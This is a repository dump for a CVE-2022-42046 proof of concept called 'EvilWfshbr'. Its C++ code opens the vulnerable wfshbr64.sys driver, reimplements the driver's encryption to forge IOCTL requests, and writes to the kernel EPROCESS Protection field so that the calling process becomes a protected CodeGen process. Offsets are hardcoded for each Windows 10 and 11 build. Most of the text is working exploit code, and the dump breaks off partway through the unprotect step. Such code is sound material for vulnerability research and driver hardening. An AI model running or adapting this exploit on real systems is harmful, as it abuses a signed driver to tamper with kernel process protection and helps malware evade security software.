Project Path: arc_gmh5225_CVE-2022-42046_1mlbh4kc

Source Tree:

```txt
arc_gmh5225_CVE-2022-42046_1mlbh4kc
├── EvilWfshbr
│   ├── EvilWfshbr.cpp
│   ├── EvilWfshbr.vcxproj
│   ├── EvilWfshbr.vcxproj.filters
│   └── lazy_importer.hpp
├── EvilWfshbr.sln
├── LICENSE
├── README.md
└── wfsexploit
    ├── Cargo.toml
    ├── README.md
    └── src
        ├── main.rs
        └── tests
            ├── crypt.rs
            ├── mod.rs
            └── structs_x64.rs

```

`EvilWfshbr.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.2.32630.192
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "EvilWfshbr", "EvilWfshbr\EvilWfshbr.vcxproj", "{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Debug|x64.ActiveCfg = Debug|x64
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Debug|x64.Build.0 = Debug|x64
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Debug|x86.ActiveCfg = Debug|Win32
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Debug|x86.Build.0 = Debug|Win32
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Release|x64.ActiveCfg = Release|x64
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Release|x64.Build.0 = Release|x64
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Release|x86.ActiveCfg = Release|Win32
		{7F147AEE-3AA9-42F1-9A3E-4E6A120688EF}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {938D4D1A-0A43-4F85-A404-709B34365FA6}
	EndGlobalSection
EndGlobal

```

`EvilWfshbr/EvilWfshbr.cpp`:

```cpp
// The MIT License (MIT) https://opensource.org/licenses/MIT
//
// Copyright (c) 2022 Kento Oki <hrn832@protonmail.com>
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>

#include "lazy_importer.hpp"

#define WFSHBR_DEVICE_TYPE 0xAA01

#define IOCTL_WFSHBR_QUERY_SEED                        \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE10, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013840

#define IOCTL_WFSHBR_REMOVE_FLAG                       \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE20, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013880

#define IOCTL_WFSHBR_ADD_FLAG                          \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE21, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013884

#define IOCTL_WFSHBR_AND_FLAG                          \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE22, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013888

#define IOCTL_WFSHBR_QUERY_RANDOM_1                    \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE30, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA0138C0

#define IOCTL_WFSHBR_QUERY_RANDOM_2                    \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE31, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA0138C4

#define EVIL_WFSHBR_PRINT(format, ...) printf((format), __VA_ARGS__)

#define EVIL_WFSHBR_PRINT_ERROR(format, ...)  \
  EVIL_WFSHBR_PRINT(                          \
      " \x1b[002m│\x1b[0m "                 \
      "\x1b[0;1;41m[FAIL]\x1b[0m"             \
      " \x1b[002m│\x1b[0m " format "\x1b[0m", \
      __VA_ARGS__)

#define EVIL_WFSHBR_PRINT_INFO(format, ...)   \
  EVIL_WFSHBR_PRINT(                          \
      " \x1b[002m│\x1b[0m "                 \
      "\x1b[0;104;1m[INFO]\x1b[0m"            \
      " \x1b[002m│\x1b[0m " format "\x1b[0m", \
      __VA_ARGS__)

typedef struct _PS_PROTECTION {
  union {
    UCHAR Level;
    struct {
      UCHAR Type : 3;
      UCHAR Audit : 1;
      UCHAR Signer : 4;
    } Flags;
  };
} PS_PROTECTION, *PPS_PROTECTION;

typedef enum _PS_PROTECTED_SIGNER {
  PsProtectedSignerNone = 0,
  PsProtectedSignerAuthenticode = 1,
  PsProtectedSignerCodeGen = 2,
  PsProtectedSignerAntimalware = 3,
  PsProtectedSignerLsa = 4,
  PsProtectedSignerWindows = 5,
  PsProtectedSignerWinTcb = 6,
  PsProtectedSignerMax = 7
} PS_PROTECTED_SIGNER;

typedef enum _PS_PROTECTED_TYPE {
  PsProtectedTypeNone = 0,
  PsProtectedTypeProtectedLight = 1,
  PsProtectedTypeProtected = 2,
  PsProtectedTypeMax = 3
} PS_PROTECTED_TYPE;

NTSTATUS WINAPI RtlGetVersion(OSVERSIONINFOEXW* Version);

#define ProcessProtectionInformation ((PROCESSINFOCLASS)(0x3D))  // 61

typedef struct _WFSHBR_IOCTL_QUERY_SEED {
  //
  // if succeeded, driver sets this field to 1UL.
  //
  _Out_ ULONG IsSucceeded;

  //
  // if succeeded, driver seed is returned in this field.
  // This seed is low part of the 8-byte value obtained
  // from the KeQuerySystemTime, whis is initialized
  // whenever the driver entry point is called.
  //
  _Out_ ULONG Seed;
} WFSHBR_IOCTL_QUERY_SEED, *PWFSHBR_IOCTL_QUERY_SEED;
static_assert(sizeof(WFSHBR_IOCTL_QUERY_SEED) == 0x8,
              "struct size must be 0x8");

typedef struct _WFSHBR_IOCTL_FLAG_OPERATION {
  //
  // Arbitrary offset of the EPROCESS to manipulate
  // with bitwise operation.
  //
  // The driver doesn't verify that this is the actual
  // _EPROCESS::Protection offset.
  // As such, you can specify any value but only within
  // 0x1000 value.
  //
  _In_ ULONG ArbitraryEProcessOffset;

  //
  // This is the flag you want to set it in the _EPROCESS
  // offset specified in previous field.
  // This is arbitrary and no limitation and no verification
  // is proceeded in the driver.
  //
  _In_ ULONG DesiredFlags;

  //
  // This value is not target process.
  // The target process is limited only self as driver references
  // (PsGetCurrentProcess + ArbitraryEProcessOffset).
  //
  // However, the driver verifies that the request is actually
  // comes from their desired usage by encrypting self-process id.
  //
  _In_ ULONG EncryptedSelfProcessId;
} WFSHBR_IOCTL_FLAG_OPERATION, *PWFSHBR_IOCTL_FLAG_OPERATION;
static_assert(sizeof(WFSHBR_IOCTL_FLAG_OPERATION) == 0xC,
              "struct size must be 0xC");

typedef struct _WFSHBR_IOCTL_RESULT {
  //
  // if succeeded, driver sets 1UL to this field.
  //
  _Out_ ULONG Result;
} WFSHBR_IOCTL_RESULT, *PWFSHBR_IOCTL_RESULT;
static_assert(sizeof(WFSHBR_IOCTL_RESULT) == 0x4, "struct size must be 0x4");

#pragma pack(4)
typedef struct _WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT {
  //
  // if succeeded, driver sets 1UL to this field.
  //
  _Out_ ULONG Result;
  union {
    struct {
      _Out_ ULONG LowPart;
      _Out_ ULONG HighPart;
    };
    ULONGLONG QuadPart;
  };
} WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT, *PWFSHBR_IOCTL_QUERY_RANDOM_1_RESULT;
static_assert(sizeof(WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT) == 0xC,
              "struct size must be 0xC");
#pragma pack()

typedef struct _WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT {
  //
  // if succeeded, driver sets 1UL to this field.
  //
  _Out_ ULONG Result;
  _Out_ ULONG Value;
} WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT, *PWFSHBR_IOCTL_QUERY_RANDOM_2_RESULT;
static_assert(sizeof(WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT) == 0x8,
              "struct size must be 0x8");

typedef struct _EVIL_WFSHBR_DYN_CONTEXT {
  struct {
    ULONG Protection;  // _EPROCESS::Protection<PS_PROTECTION>
  } EPROCESS;
} EVIL_WFSHBR_DYN_CONTEXT, *PEVIL_WFSHBR_DYN_CONTEXT;

#define WINVER_WIN11_22H2 (22621)
#define WINVER_WIN11_21H2 (22000)
#define WINVER_WIN10_21H2 (19044)
#define WINVER_WIN10_21H1 (19043)
#define WINVER_WIN10_20H2 (19042)
#define WINVER_WIN10_2004 (19041)
#define WINVER_WIN10_1909 (18363)
#define WINVER_WIN10_1903 (18362)
#define WINVER_WIN10_1809 (17763)
#define WINVER_WIN10_1803 (17134)
#define WINVER_WIN10_1709 (16299)
#define WINVER_WIN10_1703 (15063)
#define WINVER_WIN10_1607 (14393)
#define WINVER_WIN10_1511 (10586)
#define WINVER_WIN10_1507 (10240)

//
// Global variables.
//

inline EVIL_WFSHBR_DYN_CONTEXT g_EvilWfshbrDynContext = {0};
inline OSVERSIONINFOEXW g_OsVersionInfo = {0};
inline DWORD g_MinorVersion = {0};
inline DWORD g_MajorVersion = {0};
inline DWORD g_BuildNumber = {0};
inline DWORD g_Seed = {0};

/// <summary>
/// Queries the driver seed for this session.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <returns>
/// A proper seed value if succeeded, otherwise, zero.
/// </returns>
ULONG WfshQuerySeed(_In_ HANDLE hDevice) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_QUERY_SEED In{0};

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_QUERY_SEED, NULL, 0, &In,
                       sizeof(In), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return 0;
  }

  if (!In.IsSucceeded) {
    EVIL_WFSHBR_PRINT_INFO("%s: Failed to query seed\n", __FUNCTION__);
    return 0;
  }

  return In.Seed;
}

ULONGLONG WfshQueryRandom1(_In_ HANDLE hDevice) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT Out{0};

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_QUERY_RANDOM_1, NULL, 0, &Out,
                       sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return 0;
  }

  if (!Out.Result) {
    EVIL_WFSHBR_PRINT_INFO("%s: Failed to query random1\n", __FUNCTION__);
    return 0;
  }

  return Out.QuadPart;
}

ULONG WfshQueryRandom2(_In_ HANDLE hDevice) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT Out{0};

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_QUERY_RANDOM_2, NULL, 0, &Out,
                       sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return 0;
  }

  if (!Out.Result) {
    EVIL_WFSHBR_PRINT_INFO("%s: Failed to query random2\n", __FUNCTION__);
    return 0;
  }

  return Out.Value;
}

/// <summary>
/// Obtains protection state of the current process.
/// </summary>
/// <param name="Protection">Specifies a pointer to the protection.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN GetProcessProtection(_Out_ PS_PROTECTION* Protection) {
  NTSTATUS Status;
  ULONG ReturnLength = 0;

  Status = LI_FN(NtQueryInformationProcess)(
      GetCurrentProcess(), ProcessProtectionInformation,
      reinterpret_cast<PVOID>(Protection), sizeof(*Protection), &ReturnLength);

  if (!NT_SUCCESS(Status)) {
    return FALSE;
  }

  return TRUE;
}

/// <summary>
/// The phase 2 of the wfshbr encrypton process.
/// </summary>
/// <param name="PrePlain">Specifies pre-plain proceeded in phase 1.</param>
/// <returns>
/// Always proceeded cipher, no indication of successfull operation.
/// </returns>
ULONG WfshEncryptPhase2(_In_ USHORT PrePlain) {
  ULONG CurrentPrePlain = PrePlain;
  ULONG BitwisePrePlain = 0;

  CurrentPrePlain += 1;
  CurrentPrePlain *= 0xB1F7;

  ULONGLONG Temp = static_cast<ULONGLONG>(0xFFFF0001) *
                   static_cast<ULONGLONG>(CurrentPrePlain);

  BitwisePrePlain = static_cast<DWORD>(Temp >> 32);
  BitwisePrePlain = BitwisePrePlain >> 0x10;
  BitwisePrePlain *= 0x10001;

  CurrentPrePlain -= BitwisePrePlain;
  CurrentPrePlain -= 1;

  return CurrentPrePlain;
}

/// <summary>
/// The phase 1 of the wfshbr encrypton process.
/// </summary>
/// <param name="PrePlain">Specifies pre-plain proceeded in phase 0.</param>
/// <returns>
/// Always proceeded cipher, no indication of successfull operation.
/// </returns>
ULONG WfshEncryptPhase1(_In_ ULONG PrePlain) {
  USHORT Cipher1;
  USHORT Cipher2;

  Cipher1 = WfshEncryptPhase2(PrePlain & 0x0000FFFF);
  Cipher2 = WfshEncryptPhase2(PrePlain >> 16);

  return static_cast<ULONG>((Cipher2 << 16) + Cipher1);
}

/// <summary>
/// The phase 0 of the wfshbr encrypton process.
/// </summary>
/// <param name="Round">Specifies cipher round.</param>
/// <param name="Plain">Specifies plain 4-byte long value to encrypt.</param>
/// <returns>
/// Always proceeded cipher, no indication of successfull operation.
/// </returns>
ULONG WfshEncryptPhase0(_In_ ULONG Round, _In_ ULONG Plain) {
  ULONG CurrentRound = Round;
  ULONG Cipher = 0;
  ULONG XorCipher = Plain;
  ULONG BitwiseCipher = Round;

  do {
    if ((CurrentRound & 0x00000001) == 1) {
      Cipher ^= XorCipher;
    }

    BitwiseCipher = XorCipher;
    XorCipher *= 2;
    BitwiseCipher >>= 0x1F;

    if (BitwiseCipher != 0) {
      XorCipher ^= 0x357935E9;
    }

    CurrentRound >>= 1;
  } while (CurrentRound != 0);

  return Cipher;
}

/// <summary>
/// Encrypts given process id with the given seed.
/// </summary>
/// <param name="ProcessId">Specifies the process id.</param>
/// <param name="Seed">Specifies the seed obtained from the wfshbr
/// driver.</param> <returns> returns encrypted 4-byte value.
/// </returns>
ULONG WfshEncryptPayload(_In_ ULONG ProcessId, _In_ ULONG Seed) {
  ULONG CipherPhase0;
  ULONG CipherPhase1;

  CipherPhase0 = WfshEncryptPhase0(0x77FD097E, Seed + ProcessId);
  CipherPhase1 = WfshEncryptPhase1(CipherPhase0);

  return CipherPhase1;
}

/// <summary>
/// Protects the current process with Full CodeGen.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <param name="AdditionalBitsIndex">Specifies bit flags map index.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfshProtectProcess(_In_ HANDLE hDevice,
                           _In_ ULONG AdditionalBitsIndex) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_FLAG_OPERATION In{0};
  PS_PROTECTION Protection;
  Protection.Flags.Signer = PsProtectedSignerCodeGen;
  Protection.Flags.Type = PsProtectedTypeProtected;

  In.EncryptedSelfProcessId = WfshEncryptPayload(GetCurrentProcessId(), g_Seed);
  In.ArbitraryEProcessOffset =
      g_EvilWfshbrDynContext.EPROCESS.Protection - AdditionalBitsIndex;
  In.DesiredFlags = Protection.Level << AdditionalBitsIndex * 8;

  WFSHBR_IOCTL_RESULT Out{0};

  // Adjustment.
  WfshQueryRandom1(hDevice);

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_ADD_FLAG, &In, sizeof(In),
                       &Out, sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return FALSE;
  }

  //
  // if succeeded, 1UL value is set in the output buffer.
  //

  if (Out.Result == 1) {
    return TRUE;
  }

  return FALSE;
}

/// <summary>
/// Protects the current process with Full CodeGen.
/// With the way enumerates all possible bit flags map index.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfsProtectProcessSupreme(_In_ HANDLE hDevice) {
  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshProtectProcess(hDevice, Index)) {
      return TRUE;
    }
  }

  return FALSE;
}

/// <summary>
/// Unprotects the current process.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <param name="AdditionalBitsIndex">Specifies bit flags map index.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfshUnprotectProcess(_In_ HANDLE hDevice,
                             _In_ ULONG AdditionalBitsIndex) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_FLAG_OPERATION In{0};
  PS_PROTECTION Protection;
  Protection.Flags.Signer = PsProtectedSignerCodeGen;
  Protection.Flags.Type = PsProtectedTypeProtected;

  In.EncryptedSelfProcessId = WfshEncryptPayload(GetCurrentProcessId(), g_Seed);
  In.ArbitraryEProcessOffset =
      g_EvilWfshbrDynContext.EPROCESS.Protection - AdditionalBitsIndex;
  In.DesiredFlags = Protection.Level << AdditionalBitsIndex * 8;

  WFSHBR_IOCTL_RESULT Out{0};

  // Adjustment.
  WfshQueryRandom1(hDevice);

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_REMOVE_FLAG, &In, sizeof(In),
                       &Out, sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return FALSE;
  }

  //
  // if succeeded, 1UL value is set in the output buffer.
  //

  if (Out.Result == 1) {
    return TRUE;
  }
  

  return FALSE;
}

/// <summary>
/// Unprotects the current process.
/// With the way enumerates all possible bit flags map index.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfsUnprotectProcessSupreme(_In_ HANDLE hDevice) {
  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshUnprotectProcess(hDevice, Index)) {
      return TRUE;
    }
  }

  return FALSE;
}

/// <summary>
/// Converts protection signer to the C null-terminated string.
/// </summary>
/// <param name="Protection">Specifies protection.</param>
/// <returns>
/// Always null-terminated C string, never null.
/// </returns>
LPCSTR ProtectSignerToString(_In_ PS_PROTECTION Protection) {
  LPCSTR ProtectSignerString = "UNKNOWN_SIGNER";

  switch (Protection.Flags.Signer) {
    case PS_PROTECTED_SIGNER::PsProtectedSignerNone: {
      ProtectSignerString = "None";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerAntimalware: {
      ProtectSignerString = "Antimalware";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerAuthenticode: {
      ProtectSignerString = "Authenticode";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerCodeGen: {
      ProtectSignerString = "CodeGen";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerLsa: {
      ProtectSignerString = "Lsa";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerWindows: {
      ProtectSignerString = "Windows";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerWinTcb: {
      ProtectSignerString = "WinTcb";
      break;
    }
    default: {
      break;
    }
  }

  return ProtectSignerString;
}

/// <summary>
/// Converts protection type to the C null-terminated string.
/// </summary>
/// <param name="Protection">Specifies protection.</param>
/// <returns>
/// Always null-terminated C string, never null.
/// </returns>
LPCSTR ProtectTypeToString(_In_ PS_PROTECTION Protection) {
  LPCSTR ProtectTypeString = "UNKNOWN_TYPE";

  switch (Protection.Flags.Type) {
    case PS_PROTECTED_TYPE::PsProtectedTypeNone: {
      ProtectTypeString = "None";
      break;
    }
    case PS_PROTECTED_TYPE::PsProtectedTypeProtected: {
      ProtectTypeString = "FULL";
      break;
    }
    case PS_PROTECTED_TYPE::PsProtectedTypeProtectedLight: {
      ProtectTypeString = "LIGHT";
      break;
    }
    default: {
      break;
    }
  }

  return ProtectTypeString;
}

/// <summary>
/// Parses system kernel version and stores into global
/// variables.
/// </summary>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN ParseSystemVersion() {
  NTSTATUS Status;

  // ntdll!RtlGetVersion
  Status = LI_FN(RtlGetVersion)(&g_OsVersionInfo);

  if (!NT_SUCCESS(Status)) {
    return FALSE;
  }

  g_MinorVersion = g_OsVersionInfo.dwMinorVersion;
  g_MajorVersion = g_OsVersionInfo.dwMajorVersion;
  g_BuildNumber = g_OsVersionInfo.dwBuildNumber;

  return TRUE;
}

/// <summary>
/// Parses system kernel offsets and stores into global
/// application context.
/// </summary>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN ParseOffsets() {
  //
  // Only supports Windows 10 and 11 at this time, but this
  // should work on almost whole version of Windows product.
  //
  if (((g_MajorVersion * 10) + g_MinorVersion) != 100) {
    return FALSE;
  }

  //
  // Hardcoding such offsets is not a best practice,
  // but here is just to achieve the exploit result.
  //
  switch (g_BuildNumber) {
    case WINVER_WIN11_22H2:
    case WINVER_WIN11_21H2:
    case WINVER_WIN10_21H2:
    case WINVER_WIN10_21H1:
    case WINVER_WIN10_20H2:
    case WINVER_WIN10_2004: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x87A;
      break;
    }
    case WINVER_WIN10_1909:
    case WINVER_WIN10_1903: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6FA;
      break;
    }
    case WINVER_WIN10_1809:
    case WINVER_WIN10_1803:
    case WINVER_WIN10_1709:
    case WINVER_WIN10_1703: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6CA;
      break;
    }
    case WINVER_WIN10_1607: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6C2;
      break;
    }
    case WINVER_WIN10_1511: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6B2;
      break;
    }
    case WINVER_WIN10_1507: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6AA;
      break;
    }
    default: {
      return FALSE;
    }
  }

  return TRUE;
}

/// <summary>
/// Prints protection information of the current process.
/// </summary>
void PrintProtectionStatus(void) {
  PS_PROTECTION Protection;

  if (!GetProcessProtection(&Protection)) {
    EVIL_WFSHBR_PRINT_ERROR(
        "Failed to obtain protection information LastError(0x%lX)\n",
        GetLastError());
    return;
  }

  LPCSTR ProtectionSigner;
  LPCSTR ProtectionType;

  ProtectionSigner = ProtectSignerToString(Protection);
  ProtectionType = ProtectTypeToString(Protection);

  if (!Protection.Level) {
    EVIL_WFSHBR_PRINT_INFO("Is Process Protected?: %s\n", "\x1b[91mNo\x1b[0m");
  } else {
    EVIL_WFSHBR_PRINT_INFO(
        "Is Process Protected?: %s [\x1b[92m%s\x1b[0m:\x1b[92m%s\x1b[0m]\n",
        "\x1b[92mYes\x1b[0m", ProtectionType, ProtectionSigner);
  }
}

int main(int argc, const char** argv, const char** envp) {
  UNREFERENCED_PARAMETER(argc);
  UNREFERENCED_PARAMETER(argv);
  UNREFERENCED_PARAMETER(envp);

  //
  // Enable the console colors if supported.
  //

  HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
  DWORD ConsoleMode = 0;
  
  if (GetConsoleMode(hStdOut, &ConsoleMode)) {
    if (!(ConsoleMode & ENABLE_VIRTUAL_TERMINAL_PROCESSING)) {
      ConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
      SetConsoleMode(hStdOut, ConsoleMode);
    }
  }

  EVIL_WFSHBR_PRINT(
    "\x1b[032m"
    " ╭─────────────────────────────────────────────────────────────╮\n"
    " │       \x1b[0m\x1b[36m****\x1b[0m \x1b[0m\x1b[4mEvil Wfshbr by github.com/kkent030315\x1b[0m\x1b[002m \x1b[0m\x1b[36m****\x1b[0m\x1b[032m       │\n"
    " ╰─────────────────────────────────────────────────────────────╯\n"
    "\x1b[0m\n"
    "  LICENSE: MIT License [ \x1b[002mhttps://opensource.org/licenses/MIT\x1b[0m ]\n\n"
    "  WARNING: \x1b[033mBY USING THIS SOFTWARE, YOUR SYSTEM MAY BE CORRUPTED\x1b[0m\n"
    "           \x1b[033mOR BROKEN. USE AT YOUR OWN RISK.\x1b[0m\n\n"
    "  AUTHOR(s): Kento Oki      [ \x1b[002mgithub.com/kkent030315\x1b[0m     ]\n"
    "             Kenjiro Ichise [ \x1b[002mgithub.com/DoranekoSystems\x1b[0m ]\n\n"
    "  This exploit purposely elevate self process to\n"
    "  CodeGen with full protection.\n\n"
    " ──────────────────────────────────────────────────────────────\n\n"
  );

  if (!ParseSystemVersion()) {
    EVIL_WFSHBR_PRINT_ERROR("Failed to parse system version LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("MajorVersion=\x1b[2m%d\x1b[0m "
                         "MinorVersion=\x1b[2m%d\x1b[0m "
                         "BuildNumber=\x1b[2m%d\x1b[0m\n",
                         g_MajorVersion, g_MinorVersion, g_BuildNumber);

  if (!ParseOffsets()) {
    EVIL_WFSHBR_PRINT_ERROR("Failed to parse dynamic offsets.\n"
                            "Your system may not supported.\n");
    return EXIT_FAILURE;
  }

  //
  // Check the current protection status of current process.
  //

  PrintProtectionStatus();

  //
  // Open the wfshbr64.sys device.
  //

  HANDLE hDevice;
  hDevice = CreateFile(TEXT("\\\\.\\htsysm7F34"), GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, 0, NULL);

  if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
    EVIL_WFSHBR_PRINT_ERROR("Failed to open device LastError(0x%lX)\n",
                            GetLastError());

    if (GetLastError() == ERROR_FILE_NOT_FOUND) {
      EVIL_WFSHBR_PRINT_ERROR("You may not have driver wfshbr64.sys loaded.\n");
    } else if (GetLastError() == ERROR_ACCESS_DENIED) {
      EVIL_WFSHBR_PRINT_ERROR("You may not have an proper access rights.\n");
    }

    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("Device Opened: \x1b[002m0x%lX\x1b[0m\n",
                         HandleToULong(hDevice));

  //
  // Query the driver seed as it mandatory in each payloads encryption.
  //

  g_Seed = WfshQuerySeed(hDevice);

  if (!g_Seed) {
    EVIL_WFSHBR_PRINT_ERROR("WfshQuerySeed failed LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("Driver Seed: \x1b[32m0x%lX\x1b[0m\n", g_Seed);

  ULONGLONG Random1;
  Random1 = WfshQueryRandom1(hDevice);
  EVIL_WFSHBR_PRINT_INFO("Driver Random(1): \x1b[32m0x%llX\x1b[0m\n", Random1);

  ULONG Random2;
  Random2 = WfshQueryRandom2(hDevice);
  EVIL_WFSHBR_PRINT_INFO("Driver Random(2): \x1b[32m0x%lX\x1b[0m\n", Random2);

  char input;
  do {
    EVIL_WFSHBR_PRINT_INFO(
        "Do you really want to exploit? [\x1b[002mY\x1b[0m/\x1b[002mn\x1b[0m] "
        ": ");
    std::cin >> input;
  } while (!std::cin.fail() && input != 'Y' && input != 'n');

  if (input != 'Y') {
    EVIL_WFSHBR_PRINT_INFO("The operation has successfully canceled.\n");
    return EXIT_SUCCESS;
  }

  //
  // Protect the process.
  //

  EVIL_WFSHBR_PRINT_INFO("Protecting process ...\n");

  BOOLEAN ProtectSuccess = FALSE;

  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshProtectProcess(hDevice, Index)) {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Success\x1b[0m\n", Index);
      ProtectSuccess = TRUE;
      break;
    } else {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Failure\x1b[0m\n", Index);
    }
  }

  if (!ProtectSuccess) {
    EVIL_WFSHBR_PRINT_ERROR("WfshProtectProcess failed LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("Process is now protected\n");

  //
  // Check again whether or not the current process is protected.
  //

  PrintProtectionStatus();

  //
  // Unprotect the process.
  //

  EVIL_WFSHBR_PRINT_INFO("Unprotecting process ...\n");

